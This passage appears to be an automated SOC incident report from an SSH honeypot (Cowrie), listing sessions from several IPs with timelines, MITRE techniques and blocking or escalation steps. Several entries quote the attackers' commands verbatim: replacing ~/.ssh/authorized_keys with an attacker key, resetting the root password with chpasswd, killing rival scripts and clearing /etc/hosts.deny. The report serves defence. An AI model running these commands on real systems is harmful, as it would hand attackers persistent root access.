| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:02:16` | `cowrie.session.connect` |
| `2026-06-09 06:02:16` | `cowrie.client.version` |
| `2026-06-09 06:02:16` | `cowrie.client.kex` |
| `2026-06-09 06:02:17` | `cowrie.login.success` |
| `2026-06-09 06:02:17` | `cowrie.session.params` |
| `2026-06-09 06:02:17` | `cowrie.command.input` |
| `2026-06-09 06:02:17` | `cowrie.command.failed` |
| `2026-06-09 06:02:17` | `cowrie.log.closed` |
| `2026-06-09 06:02:17` | `cowrie.session.params` |
| `2026-06-09 06:02:17` | `cowrie.command.input` |
| `2026-06-09 06:02:17` | `cowrie.session.file_download` |
| `2026-06-09 06:02:17` | `cowrie.log.closed` |
| `2026-06-09 06:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f5efa13c92

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:02 |
| **Last Seen** | 2026-06-09 06:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:02:18` | `cowrie.session.connect` |
| `2026-06-09 06:02:18` | `cowrie.client.version` |
| `2026-06-09 06:02:18` | `cowrie.client.kex` |
| `2026-06-09 06:02:18` | `cowrie.login.success` |
| `2026-06-09 06:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5673a1990de8

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-06-09 06:02 |
| **Last Seen** | 2026-06-09 06:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:02:23` | `cowrie.session.connect` |
| `2026-06-09 06:02:24` | `cowrie.client.version` |
| `2026-06-09 06:02:24` | `cowrie.client.kex` |
| `2026-06-09 06:02:25` | `cowrie.login.success` |
| `2026-06-09 06:02:25` | `cowrie.direct-tcpip.request` |
| `2026-06-09 06:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abde5de0815

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:04 |
| **Last Seen** | 2026-06-09 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:04:33` | `cowrie.session.connect` |
| `2026-06-09 06:04:33` | `cowrie.client.version` |
| `2026-06-09 06:04:33` | `cowrie.client.kex` |
| `2026-06-09 06:04:33` | `cowrie.login.success` |
| `2026-06-09 06:04:33` | `cowrie.session.params` |
| `2026-06-09 06:04:33` | `cowrie.command.input` |
| `2026-06-09 06:04:33` | `cowrie.command.failed` |
| `2026-06-09 06:04:33` | `cowrie.log.closed` |
| `2026-06-09 06:04:33` | `cowrie.session.params` |
| `2026-06-09 06:04:33` | `cowrie.command.input` |
| `2026-06-09 06:04:33` | `cowrie.session.file_download` |
| `2026-06-09 06:04:33` | `cowrie.log.closed` |
| `2026-06-09 06:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11ca1b1a0d0

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:04 |
| **Last Seen** | 2026-06-09 06:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:04:35` | `cowrie.session.connect` |
| `2026-06-09 06:04:35` | `cowrie.client.version` |
| `2026-06-09 06:04:35` | `cowrie.client.kex` |
| `2026-06-09 06:04:35` | `cowrie.login.success` |
| `2026-06-09 06:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5339dd3eb457

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:09 |
| **Last Seen** | 2026-06-09 06:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:09:03` | `cowrie.session.connect` |
| `2026-06-09 06:09:03` | `cowrie.client.version` |
| `2026-06-09 06:09:03` | `cowrie.client.kex` |
| `2026-06-09 06:09:04` | `cowrie.login.success` |
| `2026-06-09 06:09:05` | `cowrie.session.params` |
| `2026-06-09 06:09:05` | `cowrie.command.input` |
| `2026-06-09 06:09:05` | `cowrie.command.failed` |
| `2026-06-09 06:09:05` | `cowrie.log.closed` |
| `2026-06-09 06:09:06` | `cowrie.session.params` |
| `2026-06-09 06:09:06` | `cowrie.command.input` |
| `2026-06-09 06:09:06` | `cowrie.session.file_download` |
| `2026-06-09 06:09:06` | `cowrie.log.closed` |
| `2026-06-09 06:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edc655b49285

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:09 |
| **Last Seen** | 2026-06-09 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:09:09` | `cowrie.session.connect` |
| `2026-06-09 06:09:09` | `cowrie.client.version` |
| `2026-06-09 06:09:09` | `cowrie.client.kex` |
| `2026-06-09 06:09:10` | `cowrie.login.success` |
| `2026-06-09 06:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be24c63ee999

| Field | Detail |
|---|---|
| **Source IP** | `117.80.226[.]34` |
| **First Seen** | 2026-06-09 06:10 |
| **Last Seen** | 2026-06-09 06:11 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tlJnL9l5kvH4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:10:31` | `cowrie.session.connect` |
| `2026-06-09 06:10:31` | `cowrie.client.version` |
| `2026-06-09 06:10:32` | `cowrie.client.kex` |
| `2026-06-09 06:10:40` | `cowrie.login.success` |
| `2026-06-09 06:10:41` | `cowrie.session.params` |
| `2026-06-09 06:10:41` | `cowrie.command.input` |
| `2026-06-09 06:10:41` | `cowrie.command.failed` |
| `2026-06-09 06:10:41` | `cowrie.log.closed` |
| `2026-06-09 06:10:41` | `cowrie.session.params` |
| `2026-06-09 06:10:41` | `cowrie.command.input` |
| `2026-06-09 06:10:42` | `cowrie.session.file_download` |
| `2026-06-09 06:10:42` | `cowrie.log.closed` |
| `2026-06-09 06:11:01` | `cowrie.session.params` |
| `2026-06-09 06:11:01` | `cowrie.command.input` |
| `2026-06-09 06:11:01` | `cowrie.log.closed` |
| `2026-06-09 06:11:02` | `cowrie.session.params` |
| `2026-06-09 06:11:02` | `cowrie.command.input` |
| `2026-06-09 06:11:02` | `cowrie.log.closed` |
| `2026-06-09 06:11:03` | `cowrie.session.params` |
| `2026-06-09 06:11:03` | `cowrie.command.input` |
| `2026-06-09 06:11:03` | `cowrie.session.file_download` |
| `2026-06-09 06:11:03` | `cowrie.log.closed` |
| `2026-06-09 06:11:04` | `cowrie.session.params` |
| `2026-06-09 06:11:04` | `cowrie.command.input` |
| `2026-06-09 06:11:04` | `cowrie.log.closed` |
| `2026-06-09 06:11:05` | `cowrie.session.params` |
| `2026-06-09 06:11:05` | `cowrie.command.input` |
| `2026-06-09 06:11:05` | `cowrie.log.closed` |
| `2026-06-09 06:11:05` | `cowrie.session.params` |
| `2026-06-09 06:11:05` | `cowrie.command.input` |
| `2026-06-09 06:11:05` | `cowrie.command.input` |
| `2026-06-09 06:11:10` | `cowrie.log.closed` |
| `2026-06-09 06:11:10` | `cowrie.session.params` |
| `2026-06-09 06:11:10` | `cowrie.command.input` |
| `2026-06-09 06:11:12` | `cowrie.log.closed` |
| `2026-06-09 06:11:12` | `cowrie.session.params` |
| `2026-06-09 06:11:12` | `cowrie.command.input` |
| `2026-06-09 06:11:12` | `cowrie.log.closed` |
| `2026-06-09 06:11:13` | `cowrie.session.params` |
| `2026-06-09 06:11:13` | `cowrie.command.input` |
| `2026-06-09 06:11:13` | `cowrie.log.closed` |
| `2026-06-09 06:11:14` | `cowrie.session.params` |
| `2026-06-09 06:11:14` | `cowrie.command.input` |
| `2026-06-09 06:11:15` | `cowrie.log.closed` |
| `2026-06-09 06:11:15` | `cowrie.session.params` |
| `2026-06-09 06:11:15` | `cowrie.command.input` |
| `2026-06-09 06:11:15` | `cowrie.log.closed` |
| `2026-06-09 06:11:16` | `cowrie.session.params` |
| `2026-06-09 06:11:16` | `cowrie.command.input` |
| `2026-06-09 06:11:16` | `cowrie.log.closed` |
| `2026-06-09 06:11:17` | `cowrie.session.params` |
| `2026-06-09 06:11:17` | `cowrie.command.input` |
| `2026-06-09 06:11:18` | `cowrie.log.closed` |
| `2026-06-09 06:11:18` | `cowrie.session.params` |
| `2026-06-09 06:11:18` | `cowrie.command.input` |
| `2026-06-09 06:11:19` | `cowrie.log.closed` |
| `2026-06-09 06:11:19` | `cowrie.session.params` |
| `2026-06-09 06:11:19` | `cowrie.command.input` |
| `2026-06-09 06:11:20` | `cowrie.log.closed` |
| `2026-06-09 06:11:20` | `cowrie.session.params` |
| `2026-06-09 06:11:20` | `cowrie.command.input` |
| `2026-06-09 06:11:21` | `cowrie.log.closed` |
| `2026-06-09 06:11:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.80.226[.]34` to AbuseIPDB if not already reported
- [ ] Block `117.80.226[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6541199c4ee7

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:12 |
| **Last Seen** | 2026-06-09 06:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:12:48` | `cowrie.session.connect` |
| `2026-06-09 06:12:48` | `cowrie.client.version` |
| `2026-06-09 06:12:48` | `cowrie.client.kex` |
| `2026-06-09 06:12:49` | `cowrie.login.success` |
| `2026-06-09 06:12:49` | `cowrie.session.params` |
| `2026-06-09 06:12:49` | `cowrie.command.input` |
| `2026-06-09 06:12:49` | `cowrie.command.failed` |
| `2026-06-09 06:12:50` | `cowrie.log.closed` |
| `2026-06-09 06:12:50` | `cowrie.session.params` |
| `2026-06-09 06:12:50` | `cowrie.command.input` |
| `2026-06-09 06:12:50` | `cowrie.session.file_download` |
| `2026-06-09 06:12:50` | `cowrie.log.closed` |
| `2026-06-09 06:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465c920b3edd

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:12 |
| **Last Seen** | 2026-06-09 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:12:53` | `cowrie.session.connect` |
| `2026-06-09 06:12:53` | `cowrie.client.version` |
| `2026-06-09 06:12:54` | `cowrie.client.kex` |
| `2026-06-09 06:12:55` | `cowrie.login.success` |
| `2026-06-09 06:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89759b026640

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:16 |
| **Last Seen** | 2026-06-09 06:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:16:34` | `cowrie.session.connect` |
| `2026-06-09 06:16:34` | `cowrie.client.version` |
| `2026-06-09 06:16:34` | `cowrie.client.kex` |
| `2026-06-09 06:16:34` | `cowrie.login.success` |
| `2026-06-09 06:16:34` | `cowrie.session.params` |
| `2026-06-09 06:16:34` | `cowrie.command.input` |
| `2026-06-09 06:16:34` | `cowrie.command.failed` |
| `2026-06-09 06:16:34` | `cowrie.log.closed` |
| `2026-06-09 06:16:34` | `cowrie.session.params` |
| `2026-06-09 06:16:34` | `cowrie.command.input` |
| `2026-06-09 06:16:34` | `cowrie.session.file_download` |
| `2026-06-09 06:16:34` | `cowrie.log.closed` |
| `2026-06-09 06:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37ed87e743c

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:16 |
| **Last Seen** | 2026-06-09 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:16:36` | `cowrie.session.connect` |
| `2026-06-09 06:16:36` | `cowrie.client.version` |
| `2026-06-09 06:16:36` | `cowrie.client.kex` |
| `2026-06-09 06:16:36` | `cowrie.login.success` |
| `2026-06-09 06:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8c15d16ede

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:20 |
| **Last Seen** | 2026-06-09 06:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:20:34` | `cowrie.session.connect` |
| `2026-06-09 06:20:34` | `cowrie.client.version` |
| `2026-06-09 06:20:34` | `cowrie.client.kex` |
| `2026-06-09 06:20:34` | `cowrie.login.success` |
| `2026-06-09 06:20:34` | `cowrie.session.params` |
| `2026-06-09 06:20:34` | `cowrie.command.input` |
| `2026-06-09 06:20:34` | `cowrie.command.failed` |
| `2026-06-09 06:20:34` | `cowrie.log.closed` |
| `2026-06-09 06:20:34` | `cowrie.session.params` |
| `2026-06-09 06:20:34` | `cowrie.command.input` |
| `2026-06-09 06:20:34` | `cowrie.session.file_download` |
| `2026-06-09 06:20:34` | `cowrie.log.closed` |
| `2026-06-09 06:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89df03ca013

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:20 |
| **Last Seen** | 2026-06-09 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:20:36` | `cowrie.session.connect` |
| `2026-06-09 06:20:36` | `cowrie.client.version` |
| `2026-06-09 06:20:36` | `cowrie.client.kex` |
| `2026-06-09 06:20:36` | `cowrie.login.success` |
| `2026-06-09 06:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e321dc79523

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:22 |
| **Last Seen** | 2026-06-09 06:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:22:04` | `cowrie.session.connect` |
| `2026-06-09 06:22:04` | `cowrie.client.version` |
| `2026-06-09 06:22:04` | `cowrie.client.kex` |
| `2026-06-09 06:22:05` | `cowrie.login.success` |
| `2026-06-09 06:22:06` | `cowrie.session.params` |
